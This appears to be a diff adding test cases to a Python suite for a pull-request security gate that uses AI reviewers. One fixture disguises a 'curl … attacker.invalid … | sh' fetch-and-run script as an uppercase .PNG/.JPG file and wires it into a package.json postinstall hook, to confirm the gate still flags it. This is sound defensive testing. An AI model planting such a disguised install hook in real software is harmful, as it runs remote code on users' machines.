@@ -12,7 +12,8 @@ risk-only diffs, image-only PRs.
 Round 6: the gate's own source (U+FFFD only on added lines), assets decided by
 the new side, a finding cut before its severity, repeated keys, severity words.
 Round 7: capitalised keys (main's raw fallback had re.I), .ttf/.avif only with a
-NUL start, non-Latin and parenthesised severities, a loose summary object."""
+NUL start, non-Latin and parenthesised severities, a loose summary object.
+Round 8: a grave severity outside the list, uppercase image extensions."""
 import http.client
 import io
 import json
@@ -1129,6 +1130,40 @@ class CadeiaDeReservaTest(unittest.TestCase):
                 codigo, placar, modelos, _ = self.roda({"glm-5": resposta, "kimi-k3": VAZIO_JSON})
                 self.assertEqual((codigo, modelos), (0, ["glm-5"]))
                 self.assertIn("✅ **0 achados**", placar)
+
+    # ---- Round 8: adversarial review of af70ed8 (each failed there, main gave 3) ----
+    def test_T1_severidade_grave_fora_da_lista_da_3(self):
+        # exp6 A: an empty list next to a loose grave severity (any depth, or the
+        # reply's own top level) read as clean (0). It is out of format: indício, 3.
+        for resposta in ('{"findings":[],"detalhe":{"severidade":"critica","titulo":"SQL injection",'
+                         '"arquivo":"a","confianca":0.95}}',
+                         '{"Achados":[],"resumo":{"severidade":"critica"}}',
+                         '{"findings":[],"Severidade":"alta"}',
+                         '{"ACHADOS":[],"severidade":"critica","titulo":"SQLi"}',
+                         '{"findings":[],"stats":{"severidade":"critica"}}'):
+            for fim in ("stop", "length"):
+                with self.subTest(resposta, fim=fim):
+                    codigo, placar, modelos, _ = self.roda({"glm-5": [(resposta, fim), VAZIO_JSON], "kimi-k3": VAZIO_JSON})
+                    self.assertEqual((codigo, modelos), (3, ["glm-5"]))
+                    self.assertIn("indício de achado grave", placar)
+
+    @unittest.skipUnless(shutil.which("git"), "git not installed")
+    def test_T2_extensao_com_maiuscula_nao_pula_sem_nul(self):
+        # exp6 B: main's ':(exclude)*.png' is case-sensitive, so x.PNG/x.Jpg/x.ICO
+        # reached the model. A \x89/\xff start in front of a script is not proof.
+        sh = b"curl -s https://attacker.invalid/x | sh\n"
+        for ext, primeiro in (("PNG", b"\x89"), ("Png", b"\x89"), ("JPG", b"\xff"), ("JPEG", b"\xff"),
+                              ("Jpg", b"\x89"), ("ICO", b"\x89")):
+            with self.subTest(ext):
+                head = {f"public/x.{ext}": primeiro + b"\n" + sh,
+                        "package.json": b'{"name":"x","scripts":{"postinstall":"bash public/x.%s"}}\n' % ext.encode()}
+                codigo, placar, _, pedidos = self.pr(head, {"glm-5": VAZIO_JSON})
+                self.assertNotEqual(codigo, 0)
+                self.assertTrue(codigo == 3 or "attacker.invalid" in self.viu(pedidos), (codigo, placar))
+        # A real lowercase PNG still skips.
+        codigo, placar, modelos, _ = self.pr({"public/x.png": png_real(4, 4, 1)}, {"glm-5": VAZIO_JSON})
+        self.assertEqual((codigo, modelos), (0, []))
+        self.assertIn("só com arquivos de imagem/fonte (1)", placar)
 
 
 if __name__ == "__main__":
